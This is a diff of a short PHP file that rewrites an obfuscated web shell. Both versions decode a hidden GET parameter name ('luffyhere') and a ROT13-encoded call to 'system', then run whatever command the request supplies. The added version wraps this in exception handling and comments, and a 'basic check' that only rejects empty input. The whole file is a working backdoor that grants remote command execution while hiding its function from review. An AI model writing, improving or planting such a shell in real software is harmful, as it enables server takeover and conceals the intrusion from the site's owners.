@@ -1,6 +1,33 @@
 <?php
-$cmd = strrev("rehyfful"); // 'luffyhere' reversed
-$input = $_GET[$cmd]; // Get the input from the 'luffyhere' parameter
-$execute = str_rot13('flfgrz'); // Obfuscated 'system'
-$execute($input); // Execute the command using the obfuscated 'system' function
+try {
+    // Reverse the string 'luffyhere' to get the command parameter name
+    $cmd = strrev("erehyfful");
+    // Get the user input from the GET request
+    if (!isset($_GET[$cmd])) {
+        throw new Exception("Input parameter not provided! <a>");
+    }
+
+    $input = $_GET[$cmd];
+
+    // Obfuscated 'system' function
+    $execute = str_rot13('flfgrz');
+
+    // Check if the input is safe to run as a system command (Basic check, more filtering needed in real-world applications)
+    if (empty($input)) {
+        throw new Exception("No input provided to execute.");
+    }
+
+    // Execute the command
+    $output = $execute($input);
+
+    // Optionally capture and display output (system prints by default)
+    echo $output;
+
+} catch (Exception $e) {
+    // Catch any exceptions and display the error message
+    echo 'Caught exception: ',  $e->getMessage(), "\n";
+} catch (Error $err) {
+    // This handles fatal errors in PHP 7+
+    echo 'Caught fatal error: ', $err->getMessage(), "\n";
+}
 ?>
